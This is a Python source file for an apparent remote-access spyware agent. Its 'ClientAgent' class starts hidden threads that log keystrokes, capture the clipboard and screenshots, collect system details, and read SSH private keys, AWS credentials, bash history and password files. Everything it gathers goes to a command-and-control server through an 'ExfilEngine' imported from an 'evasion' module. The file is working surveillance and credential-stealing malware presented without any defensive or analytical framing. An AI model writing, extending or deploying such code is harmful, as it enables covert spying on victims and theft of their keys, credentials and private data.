import time
import threading
import platform
import os
import psutil
import pyperclip
from PIL import ImageGrab
import keyboard
import json
from typing import Dict, Any, Optional
from evasion.exfil_engine import ExfilEngine
import logging
import base64

class ClientAgent:
    def __init__(self, c2_url, session_id=None):
        self.c2_url = c2_url
        self.session_id = session_id or f"agent_{int(time.time())}"
        self.exfil_engine = ExfilEngine(c2_url)
        self.running = False
        self.logger = logging.getLogger(__name__)
        
        # Data collection settings
        self.keystroke_log = []
        self.last_clipboard = ""
        
        # Start monitoring threads
        self._start_monitoring()
    
    def _start_monitoring(self):
        """Start all monitoring threads"""
        self.running = True
        
        # Keystroke monitoring
        self.keystroke_thread = threading.Thread(target=self._monitor_keystrokes, daemon=True)
        self.keystroke_thread.start()
        
        # Clipboard monitoring
        self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
        self.clipboard_thread.start()
        
        # Screenshot monitoring
        self.screenshot_thread = threading.Thread(target=self._monitor_screenshots, daemon=True)
        self.screenshot_thread.start()
        
        # System info monitoring
        self.info_thread = threading.Thread(target=self._monitor_system_info, daemon=True)
        self.info_thread.start()
        
        # File exfiltration
        self.file_thread = threading.Thread(target=self._monitor_files, daemon=True)
        self.file_thread.start()
    
    def _monitor_keystrokes(self):
        """Monitor and log keystrokes"""
        def on_key_press(event):
            self.keystroke_log.append({
                'key': event.name,
                'timestamp': time.time()
            })
            
            # Send keystrokes every 100 characters or every 30 seconds
            if len(self.keystroke_log) >= 100:
                self._send_keystrokes()
        
        keyboard.on_press(on_key_press)
        
        # Periodic flush
        while self.running:
            time.sleep(30)
            if self.keystroke_log:
                self._send_keystrokes()
    
    def _send_keystrokes(self):
        """Send collected keystrokes to C2"""
        if not self.keystroke_log:
            return
            
        data = json.dumps(self.keystroke_log)
        self.exfil_engine.exfiltrate('keystrokes', data)
        self.keystroke_log = []
    
    def _monitor_clipboard(self):
        """Monitor clipboard changes"""
        while self.running:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != self.last_clipboard and current_clipboard.strip():
                    self.exfil_engine.exfiltrate('clipboard', current_clipboard)
                    self.last_clipboard = current_clipboard
            except:
                pass
            time.sleep(2)
    
    def _monitor_screenshots(self):
        """Take periodic screenshots"""
        while self.running:
            try:
                screenshot = ImageGrab.grab()
                # Convert to base64 for transmission
                import io
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_data = img_buffer.getvalue()
                img_str = base64.b64encode(img_data).decode('utf-8')
                
                self.exfil_engine.exfiltrate('screenshot', img_str)
            except Exception as e:
                self.logger.error(f"Screenshot error: {str(e)}")
            
            # Take screenshot every 5 minutes
            time.sleep(300)
    
    def _monitor_system_info(self):
        """Collect and send system information"""
        while self.running:
            try:
                system_info = {
                    'platform': platform.platform(),
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine(),
                    'processor': platform.processor(),
                    'hostname': platform.node(),
                    'cpu_count': psutil.cpu_count(),
                    'cpu_percent': psutil.cpu_percent(interval=1),
                    'memory_total': psutil.virtual_memory().total,
                    'memory_available': psutil.virtual_memory().available,
                    'memory_percent': psutil.virtual_memory().percent,
                    'disk_usage': {
                        'total': psutil.disk_usage('/').total,
                        'used': psutil.disk_usage('/').used,
                        'free': psutil.disk_usage('/').free
                    }
                }
                
                self.exfil_engine.exfiltrate('system_info', json.dumps(system_info))
            except Exception as e:
                self.logger.error(f"System info error: {str(e)}")
            
            # Send system info every 10 minutes
            time.sleep(600)
    
    def _monitor_files(self):
        """Monitor and exfiltrate specific files"""
        target_files = [
            os.path.expanduser('~/.ssh/id_rsa'),
            os.path.expanduser('~/.ssh/id_rsa.pub'),
            os.path.expanduser('~/.aws/credentials'),
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/Documents/passwords.txt'),
            os.path.expanduser('~/Desktop/secrets.docx')
        ]
        
        while self.running:
            try:
                for file_path in target_files:
                    if os.path.exists(file_path):
                        # Check if file was modified in the last hour
                        if time.time() - os.path.getmtime(file_path) < 3600:
                            with open(file_path, 'rb') as f:
                                file_data = f.read()
                                # Encode as base64 for transmission
                                file_str = base64.b64encode(file_data).decode('utf-8')
                                file_info = {
                                    'path': file_path,
                                    'data': file_str
                                }
                                self.exfil_engine.exfiltrate('file_exfil', json.dumps(file_info))
            except Exception as e:
                self.logger.error(f"File monitoring error: {str(e)}")
            
            # Check files every 15 minutes
            time.sleep(900)
    
    def stop(self):
        """Stop all monitoring threads"""
        self.running = False
        
        # Send any remaining keystrokes
        if self.keystroke_log:
            self._send_keystrokes()
        
        # Shutdown exfiltration engine
        self.exfil_engine.shutdown()
